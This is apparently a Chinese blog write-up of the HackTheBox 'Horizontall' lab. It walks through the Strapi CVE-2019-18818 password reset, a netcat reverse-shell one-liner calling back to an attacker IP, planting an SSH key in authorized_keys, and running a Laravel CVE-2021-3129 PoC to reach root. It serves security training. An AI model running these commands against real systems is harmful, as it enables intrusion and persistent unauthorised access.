  

![](https://image.3001.net/images/20221018/1666057394_634e04b22fea4a4a6ce39.jpeg!small)

    
    
    大家好，我是你们好朋友小峰。预计从今天开始，陆陆续续为大家推出CTF-Horizontall HackTheBox 系列文章。

###  ** **0X01 简介****

#Horizontall#难度是一个相对“简单”的 CTF Linux盒子。该CTF环境涵盖了通过利用Strapi RCE 漏洞并使用内部应用程序
(Laravel) 将隧道传输到本地计算机，并且在 Laravel v 7.4.18 上运行 漏洞PoC最来提升权限拿到root用户权限。

 ** **1.1信息收集****

Ønmap端口扫描工具

 ** **1.2目录枚举****

Ø使用 wfuzz 目录枚举工具

ØStrapi 密码重置漏洞

 ** **1.3渗透测试****

Ø利用strapi CVE-2019-18818获取反向shell

Ø初始信息收集

Ø在受害者的 authorized_keys 文件中设置我的 SSH 密钥

 ** **1.4权限提升****

Ø将内部网站通过隧道连接到我们的系统

Ø利用 Laravel CVE-2021-3129获取根标志

0X02 信息收集

首先，我们利用端口探测工具对受害主机运行 nmap，查看受害主机开启哪些端口，命令如下（如图2.1所示）

    
    
    nmap -sV -sC -Pn 10.129.149.92

![](https://image.3001.net/images/20221018/1666055553_634dfd81bd5fc95d3dd59.png!small)

图2.1 namp扫描端口

###  ** **0X03 目录枚举****

根据步骤2我们发现受害主机开启2个端口，1个为22端口（SSH服务），另外一个开启80端口（HTTP协议），由于是HTTP服务所以我们知道是一个网站服务，通过nmap对端口探针发现网站标题为horizontall，为我们渗透测试机kali可以访问到网站，需要我们在
hosts 文件中添加了该地址以进行解析。（如图3.1.1所示）

![](https://image.3001.net/images/20221018/1666056086_634dff9681e69ffbfe2fd.png!small)

图3.1.1 解析过程

我们试图在网站本身上寻找可利用的漏洞信息，但在主域名网站下没有发现任何可利用信息，所以我们需要对主域名其它目录，查看是否有可利用信息，通过目录暴力破解没有发现可利用信息。所以接下来我们尝试枚举子域名，命令操作如下。

    
    
    wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.horizontall.htb" --sc 200 10.129.149.92

通过wfuzz域名检举工具，我们发现返回了一个有趣的子域，称为api-prod（如图3.1.2所示）![](https://image.3001.net/images/20221018/1666056117_634dffb5e025d4475aee1.png!small)

图3.1.2 api-prod子域

在次我们在 hosts 文件中添加这个子域名并尝试打开该网站。添加子域名操作命令如下（如图3.1.3所示）

    
    
    echo "10.129.149.92 api-prod.horizontall.htb" >> /etc/hosts

![](https://image.3001.net/images/20221018/1666056316_634e007cc33fc5535bf31.png!small)

图3.1.3 添加子域

它看起来就是一个相对普通网站，在页面上没有找到可利用信息。因此，我们尝试了目录枚举。我们找到了一个目录/admin。我们使用工具whatweb检查了这个网站的组件和相关指纹后，我们发现标题是strapi。（如图3.1.4所示）

    
    
    whatweb http://api-prod.horizontall.htb/admin/

![](https://image.3001.net/images/20221018/1666056198_634e0006ef3f80ad8049d.png!small)图3.1.4
添加子域

我们通过查看burp的响应，并注意到 strapi 版本是3.0.0-beta 17.4（如图3.1.5所示）

![](https://image.3001.net/images/20221018/1666056359_634e00a7172a6d55b0585.png!small)

图3.1.5 版本响应

 ** **0X04 渗透测试****

Searchsploit 结果显示我们可以利用给定版本的漏洞利用。此版本受到CVE-2019-18818
的漏洞。此漏洞允许攻击者在不需要身份验证令牌的情况下重置管理员密码。我们使用 searchsploit 下载了漏洞利用信息，命令如下。（如图4.1.1所示）

    
    
    searchsploit -m 50239

![](https://image.3001.net/images/20221018/1666056396_634e00cc759125a672a6a.png!small)

图4.1.1 Searchsploit漏洞

运行漏洞利用非常简单，只需将 URL 作为参数传递就足够了。（如图4.1.2所示）

    
    
    python3 50239.py http://api-prod.horizontall.htb

![](https://image.3001.net/images/20221018/1666056458_634e010aa040a29623fff.png!small)

图4.1.2 漏洞运行

如你所见，密码已重置。可以使用此登录。如您所见，在响应中，我们可以确认该帐户是管理员。（如图4.1.3所示）

![](https://image.3001.net/images/20221018/1666056477_634e011d49b7af4393f75.png!small)

图4.1.3 确认管理员账户

但是，该漏洞利用还打开了一个在服务器上运行远程命令的选项！经过多次尝试，我们找到了一个似乎可以反向shell，命令如下。（如图4.1.4所示）

    
    
    rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.10 1234 >/tmp/f

![](https://image.3001.net/images/20221018/1666056509_634e013d07dad06d3fa46.png!small)

图4.1.4 反向shell

我们已经在端口 1234 上设置了一个监听器，现在它已经收到了一个新会话。我们使用 python
pty模块将打开一个伪终端来执行系统命令。（如图4.1.5所示）

    
    
    nc -nlvp 1234python3 -c 'import pty;pty.spawn("/bin/bash")'

![](https://image.3001.net/images/20221018/1666056541_634e015dc2e3f0771a06c.png!small)

图4.1.5 设置侦听器

 ** **0X05 权限提升****

对引服务器开始信息收集，我们发现对接下来渗透有用的信息。先使用netstat命令查看一些内部服务器和哪些端口之间有过关联，发现服务器正在监听8000端口。可能意味着内部服务正在运行。（如图5.1.1所示）

    
    
    netstat -plant

![](https://image.3001.net/images/20221018/1666056597_634e0195037d68010c181.png!small)

图5.1.1 netstat 命令

在内网测试中渗透测试最好是选择和网站相关来测试，因为网站范围相对较大，更新效率不会太快，所以潜在漏洞也会多一些，方面我们快速拿到权限。另外我们发现用户strapi
对.ssh目录具有rwx 权限。（如图5.1.2所示）

    
    
    cd ~ls -lapwdcd .ssh

![](https://image.3001.net/images/20221018/1666056626_634e01b2a36105a80d3e8.png!small)

图5.1.2 rwx 权限

因此，接下来渗透动作是：

Ø在服务器的 authorized_keys 中添加我自己的 SSH 公钥

Ø启动 TCP 隧道以将端口 8000 转发到我的本地系统

Ø查看端口 8000 上的服务。

为此，使用 ssh-keygen 命令生成了一个新的 SSH 密钥对（如图5.1.3所示）

![](https://image.3001.net/images/20221018/1666056688_634e01f0ca7caf472c239.png!small)

图5.1.3 SSH 密钥

然后我将我的 id_rsa.pub 密钥复制为 authorized_keys 并使用 python 启动了一个 Web 服务器。（如图5.1.4所示）

    
    
    ssh-keygen
    cp id_rsa.pub authorized_keys
    python3 -m http.server 80

![](https://image.3001.net/images/20221018/1666056739_634e02238354cfe31dc10.png!small)

图5.1.4 启动web服务器

然后我使用目录中的 wget 将这个文件下载到我的服务器中~ /.ssh（如图5.1.5所示）

    
    
    wget http://10.10.16.10/authorized_keys

![](https://image.3001.net/images/20221018/1666056769_634e02410e54a43a72816.png!small)

图5.1.5 文件下载

复制后，我们现在可以运行 SSH 隧道，并使用以下命令将端口 8000 转发到本地系统的端口 8000：（如图5.1.6所示）

    
    
    ssh -i id_rsa -L 8000:localhost:8000 strapi@10.129.149.92

![](https://image.3001.net/images/20221018/1666056802_634e0262c202b14671f64.png!small)

图5.1.6 转发本地端口

现在，在浏览器中遍历本地端口 8000 时，我们观察到 Laravel 版本 7.4.18 正在运行。（如图5.1.7所示）

    
    
    http://localhost:8000

![](https://image.3001.net/images/20221018/1666056826_634e027a9bf3d2e353b2a.png!small)

图5.1.7 Laravel 正在运行

此版本存在CVE-2021-3129 攻击。由于 file_get_contents()
函数存在安全缺陷导致实现，此漏洞允许攻击者执行代码。我们克隆并运行了一个 PoC 在 github（如图5.1.8所示）

    
    
    git clone https://github.com/nth347/
    CVE-2021-3129_exploit.git
    cd CVE-2021-3129_exploit
    chmod +x exploit.py
    ./exploit.py http://localhost:8000 Monolog/RCE1 id
    ./exploit.py http://localhost:8000 Monolog/RCE1 "
    cat /root/root.txt"

![](https://image.3001.net/images/20221018/1666056857_634e029906f9312166396.png!small)

图5.1.8 克隆并运行 PoC

最后，该应用程序运行root 权限，因此我们能够以 root 身份执行命令。这就是我们提升权限并抓住多种渗透测试方法来测试。

###  ** **0X06 结论****

本系列准备开启国内外安全靶场渗透测试系列，也欢迎大家投稿包括但不限于VulnStack、Vulnhub、HTB、自行搭建系列靶场。通过靶场快速带领大家学习红队各系列知识。

文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担

作者：小峰

编辑：小jia

